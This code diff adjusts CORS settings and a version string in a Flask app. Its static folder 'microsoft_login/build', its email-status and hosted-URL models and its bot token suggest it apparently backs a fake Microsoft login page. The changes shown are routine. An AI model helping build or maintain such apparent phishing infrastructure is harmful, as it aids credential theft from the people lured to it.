@@ -1,4 +1,5 @@
 from flask import Flask, request, session, jsonify
+from flask_cors import CORS
 from flask import render_template, send_from_directory, redirect, Response
 from models import Email_statuses, HostedUrls, Variables
 from flask_cors import CORS
@@ -17,9 +18,8 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
-from flask_cors import CORS
 
-CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 
 # --- Application Startup Logic ---
@@ -61,7 +61,7 @@ def bot_info():
 
 @app.get("/version")
 def version():
-    return {"status":"success", "version":"cors issue"}
+    return {"status":"success", "version":"cors origins issue"}
 
 
 
@@ -77,7 +77,6 @@ def get_urls():
     except Exception as e:
         print(f"[ERROR] Could not fetch URLs from database: {e}")
         return jsonify({"error": "Failed to connect to the database."}), 500
-
 
 
 
